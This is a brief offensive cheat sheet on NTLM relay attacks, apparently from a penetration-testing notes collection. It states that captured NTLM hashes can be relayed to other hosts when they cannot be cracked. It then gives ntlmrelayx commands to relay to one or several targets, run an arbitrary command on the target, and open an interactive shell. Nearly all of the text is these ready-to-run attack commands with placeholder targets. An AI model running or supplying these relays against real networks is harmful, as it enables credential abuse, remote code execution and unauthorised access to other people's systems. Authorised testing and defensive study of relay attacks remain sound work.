Intercept a NTLM hash (like Responder) and relay it to another machine/service.

This is particularly useful when hashes cannot be cracked.

### Relay to a single target
```bash
ntlmrelayx -smb2support -t "$TARGET"
```

### Relay to multiple targets

```bash
ntlmrelayx -smb2support -ts "$TARGETS_FILE"
```

### Execute a command on target

```bash
ntlmrelayx -smb2support -t "$TARGET" -c "$COMMAND"
```

### Open a bind shell

```bash
ntlmrelayx -smb2support -t "$TARGET" -i
```